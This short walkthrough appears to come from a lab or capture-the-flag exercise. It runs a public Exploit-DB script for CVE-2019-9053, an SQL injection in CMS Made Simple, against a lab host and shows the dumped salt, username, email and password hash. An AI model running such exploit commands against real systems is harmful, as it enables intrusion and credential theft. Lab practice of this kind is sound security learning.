## CMS Made Simple SQL Injection

CMS Made Simple has a significant SQL injection vulnerability, CVE-2019-9053. A Python exploit can be found [here](https://www.exploit-db.com/exploits/46635).

```bash
$ virtualenv -p python2.7 46635
$ source 46635/bin/activate
$ (46635) pip install termcolor
$ (46635) pip install requests
$ python 46635.py -u http://10.10.162.248/simple
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```
